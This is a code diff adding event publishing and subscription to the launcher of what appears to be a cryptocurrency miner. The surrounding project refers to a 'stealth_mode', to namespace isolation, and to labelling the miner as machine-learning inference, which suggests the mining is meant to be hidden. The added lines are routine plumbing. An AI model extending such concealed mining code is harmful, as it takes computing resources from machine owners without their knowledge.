@@ -320,6 +320,35 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                 # **Simple operation logging** (ghi log thao tác đơn giản) - **remove JSON format** (loại bỏ định dạng JSON)
                 logger.info(f"START: {process_name} PID={process.pid} CMD={' '.join(mining_command)}")
                 
+                # **EventBus publish** (xuất bản sự kiện) - **PID Propagation Flow Step 1**
+                try:
+                    from mining_environment.scripts.auxiliary_modules.event_bus import get_event_bus
+                    from datetime import datetime
+                    
+                    event_bus = get_event_bus()
+                    miner_type = 'cpu' if cpu else 'gpu'
+                    
+                    payload = {
+                        'pid': process.pid,
+                        'miner_type': miner_type,
+                        'timestamp': datetime.now().isoformat(),
+                        'event_type': 'mining_started',
+                        'data': {
+                            'process_name': process_name,
+                            'command': ' '.join(mining_command),
+                            'stealth_mode': enable_stealth and cpu,
+                            'namespace_isolation': enable_ns and privileged_manager is not None
+                        }
+                    }
+                    
+                    # **Publish** (xuất bản) to channel với retry logic
+                    event_bus.publish(f'channel:{miner_type}', payload)
+                    logger.info(f"✅ Published mining_started event to channel:{miner_type} for PID {process.pid}")
+                    
+                except Exception as e:
+                    logger.error(f"❌ Failed to publish mining_started event: {e}")
+                    # **Không dừng tiến trình** nếu EventBus thất bại - **fallback** vẫn hoạt động
+                
                 # **Open log file** (mở tệp log) cho **dual logging** (ghi log kép)
                 log_file = open(miner_log_path, 'ab', buffering=0)
                 
@@ -358,8 +387,21 @@ def initialize_optimized_mining(privileged_mgr):
     """
     Khởi tạo **OptimizedCalculationChain** (chuỗi tính toán được tối ưu hóa) với **ml-inference process integration** (tích hợp quy trình suy luận máy học).
     **Enhanced** (cải tiến) để khắc phục **CPU utilization 0% issue** (vấn đề sử dụng CPU 0%).
+    **EventBus Integration** (tích hợp EventBus) - PID Propagation Flow Step 3
     """
     global optimized_integration
+    
+    # **EventBus subscribe** (đăng ký EventBus) cho CPU PID - PID Propagation Flow Step 3
+    try:
+        from mining_environment.scripts.auxiliary_modules.event_bus import get_event_bus
+        
+        event_bus = get_event_bus()
+        event_bus.subscribe('channel:cpu', _on_cpu_mining_event_for_optimization)
+        logger.info("✅ initialize_optimized_mining subscribed to channel:cpu for PID integration")
+        
+    except Exception as e:
+        logger.error(f"❌ Failed to subscribe to EventBus in initialize_optimized_mining: {e}")
+        # **Fallback** - không crash optimization nếu EventBus thất bại
     
     if not OPTIMIZED_MINING_AVAILABLE or not use_optimized_mining:
         logger.info("OptimizedCalculationChain not enabled, falling back to legacy mining")
@@ -435,6 +477,30 @@ def initialize_optimized_mining(privileged_mgr):
             optimized_integration.cleanup()
             optimized_integration = None
         return False
+
+
+def _on_cpu_mining_event_for_optimization(payload):
+    """Handle CPU mining events for OptimizedCalculationChain - PID Propagation Flow Step 3"""
+    try:
+        event_type = payload.get('event_type')
+        pid = payload.get('pid')
+        
+        if event_type == 'mining_started' and pid:
+            logger.info(f"⚡ OptimizedCalculationChain received CPU mining_started: PID={pid}")
+            
+            # **Gắn PID vào chuỗi tối ưu** - integrate with OptimizedCalculationChain
+            global optimized_integration
+            if optimized_integration and hasattr(optimized_integration, 'attach_to_existing_process'):
+                try:
+                    optimized_integration.attach_to_existing_process(pid)
+                    logger.info(f"✅ CPU PID {pid} attached to OptimizedCalculationChain")
+                except Exception as e:
+                    logger.error(f"❌ Failed to attach PID {pid} to OptimizedCalculationChain: {e}")
+            else:
+                logger.warning(f"⚠️ OptimizedCalculationChain not available for PID {pid} attachment")
+                
+    except Exception as e:
+        logger.error(f"❌ Error handling CPU mining event in optimization: {e}")
 
 def manage_cpu_miner(privileged_mgr, max_retries: int = 5):
     """
